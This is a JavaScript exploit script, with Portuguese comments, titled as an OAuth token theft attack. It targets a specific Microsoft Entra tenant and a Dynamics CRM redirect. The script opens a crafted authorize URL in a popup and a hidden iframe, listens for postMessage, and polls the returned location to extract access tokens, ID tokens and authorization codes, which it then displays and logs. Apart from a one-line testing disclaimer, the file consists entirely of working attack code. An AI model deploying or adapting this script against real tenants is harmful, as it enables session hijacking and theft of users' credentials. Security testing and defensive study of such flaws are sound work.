// OAuth Token Theft Exploit - Cross-Origin Fixed
// ATENÇÃO: Apenas para testes de segurança em ambiente controlado

if(window.exploit_execute) {
    console.log('exploit already executed');
} else {
    window.exploit_execute = 1;
    
    // URL OAuth modificada para usar fragment
    const oauthUrl = 'https://login.microsoftonline.com/03f44f58-9a15-4c83-bc6d-f35bcabf2d1b/oauth2/authorize?client_id=00000007-0000-0000-c000-000000000000&response_type=code%20id_token&scope=openid%20profile&state=OpenIdConnect.AuthenticationProperties%3DMAAAAIniUOCJRhHwpwFgRb05XxxLnBrUIAMxEuCWX6cvKTnxfTwnEBFeq15pdUnAIL4CDAEAAAABAAAACS5yZWRpcmVjdKQBaHR0cHM6Ly9vcmdkY2RjNTkwYi5jcm0yLmR5bmFtaWNzLmNvbS9tYWluLmFzcHg_YXBwaWQ9MzQ0ZTQwOTgtODE4ZC1mMDExLWI0Y2ItNjA0NWJkM2M5ZjUzJnBhZ2V0eXBlPWVudGl0eXJlY29yZCZldG49Y29udGFjdCZpZD0wMTU1OTQyNC04MjhkLWYwMTEtYjRjYi02MDQ1YmQzYzlmNTM%26ReplyUrl%3DMAAAAIniUOCJRhHwpwFgRb05XxykxfrOIJWT5gSSSxKqSGpr4QwISm8Yt1C4PcsKKCk3AGh0dHBzOi8vY3BxLS1zYW1jcm1saXZlc2c2MDUuY3JtMi5keW5hbWljcy5jb20v%26RedirectTo%3DMAAAAIniUOCJRhHwpwFgRb05Xxy4U3nBShTRmuA2wkFt5aZsP2lREyPNrSeLmwpojoEJA2h0dHBzOi8vb3JnZGNkYzU5MGIuY3JtMi5keW5hbWljcy5jb20v%26RedirectToForMcas%3Dhttps%253a%252f%252forgdcdc590b.crm2.dynamics.com%252fmain.aspx%253fappid%253d344e4098-818d-f011-b4cb-6045bd3c9f53%2526pagetype%253dentityrecord%2526etn%253dcontact%2526id%253d01559424-828d-f011-b4cb-6045bd3c9f53&response_mode=fragment&nonce=638935422387499625.NDcxNmMyYjItMmQ1YS00MDg1LWFjNGQtYjBjZjdmMDg4Nzk4MDk4OWUxZjQtNzU1MS00YzEwLWI5OTAtNzg0MmE2MmIyNWQ1&redirect_uri=https%3A%2F%2Fcpq--samcrmlivesg605.crm2.dynamics.com%2F&max_age=86400&claims=%7B%22id_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=ID_NET472&x-client-ver=8.14.0.0';
    
    console.log('Iniciando exploit OAuth...');
    
    // MÉTODO 1: Tentar abrir janela e capturar quando retornar ao mesmo domínio
    const win = window.open(oauthUrl, '_blank', 'width=500,height=600');
    
    if (!win) {
        alert('Popup bloqueado! Permita popups para este site.');
        return;
    }
    
    console.log('Janela OAuth aberta. Aguardando redirecionamento...');
    
    // MÉTODO 2: Interceptar mensagens postMessage (se disponível)
    window.addEventListener('message', function(event) {
        console.log('Mensagem recebida:', event);
        if (event.data && typeof event.data === 'string') {
            if (event.data.includes('access_token') || event.data.includes('id_token')) {
                alert('Token capturado via postMessage: ' + event.data);
                console.log('Token via postMessage:', event.data);
            }
        }
    });
    
    // MÉTODO 3: Monitorar mudanças na janela
    let attempts = 0;
    const maxAttempts = 30;
    
    function checkWindow() {
        attempts++;
        console.log(`Verificação ${attempts}/${maxAttempts}`);
        
        if (win.closed) {
            console.log('Janela foi fechada pelo usuário');
            return;
        }
        
        try {
            // Tenta acessar a URL - só funciona se estiver no mesmo domínio
            const currentUrl = win.location.href;
            console.log('URL atual:', currentUrl);
            
            // Se conseguiu acessar, significa que voltou para o mesmo domínio
            if (currentUrl.includes('crm2.dynamics.com') || currentUrl.includes(window.location.hostname)) {
                console.log('Redirecionamento detectado para domínio acessível');
                
                // Verifica se há hash na URL
                if (win.location.hash && win.location.hash.length > 1) {
                    const hash = win.location.hash.slice(1);
                    console.log('Hash capturado:', hash);
                    
                    // Parse dos tokens
                    const params = new URLSearchParams(hash);
                    const accessToken = params.get('access_token');
                    const idToken = params.get('id_token');
                    
                    let result = 'TOKENS CAPTURADOS:\n\n';
                    
                    if (accessToken) {
                        result += 'Access Token:\n' + accessToken + '\n\n';
                        console.log('Access Token:', accessToken);
                    }
                    
                    if (idToken) {
                        result += 'ID Token:\n' + idToken + '\n\n';
                        console.log('ID Token:', idToken);
                    }
                    
                    alert(result);
                    win.close();
                    return;
                }
                
                // Verifica parâmetros na URL também
                const urlParams = new URLSearchParams(win.location.search);
                if (urlParams.get('code') || urlParams.get('access_token')) {
                    alert('Código de autorização capturado: ' + win.location.href);
                    console.log('URL completa:', win.location.href);
                    win.close();
                    return;
                }
            }
            
        } catch(e) {
            // Cross-origin error é esperado quando está em login.microsoftonline.com
            if (attempts % 5 === 0) { // Log a cada 5 tentativas para não poluir
                console.log(`Cross-origin error (tentativa ${attempts}):`, e.message);
            }
        }
        
        // Continua verificando
        if (attempts < maxAttempts && !win.closed) {
            setTimeout(checkWindow, 2000);
        } else {
            console.log('Máximo de tentativas atingido');
            if (!win.closed) {
                try {
                    win.close();
                } catch(e) {}
            }
        }
    }
    
    // MÉTODO 4: Usar iframe como alternativa (menos provável de funcionar)
    function tryIframeMethod() {
        console.log('Tentando método iframe...');
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = oauthUrl;
        
        iframe.onload = function() {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                console.log('Iframe carregado:', iframeDoc.URL);
                
                if (iframeDoc.URL.includes('#')) {
                    const hash = iframeDoc.URL.split('#')[1];
                    alert('Token capturado via iframe: ' + hash);
                    console.log('Token via iframe:', hash);
                }
            } catch(e) {
                console.log('Iframe cross-origin error:', e);
            }
        };
        
        document.body.appendChild(iframe);
        
        // Remove iframe após 30 segundos
        setTimeout(() => {
            if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
            }
        }, 30000);
    }
    
    // Inicia verificações após 3 segundos
    setTimeout(checkWindow, 3000);
    
    // Tenta método iframe após 5 segundos
    setTimeout(tryIframeMethod, 5000);
    
    console.log('Exploit configurado. Aguardando interação do usuário...');
}
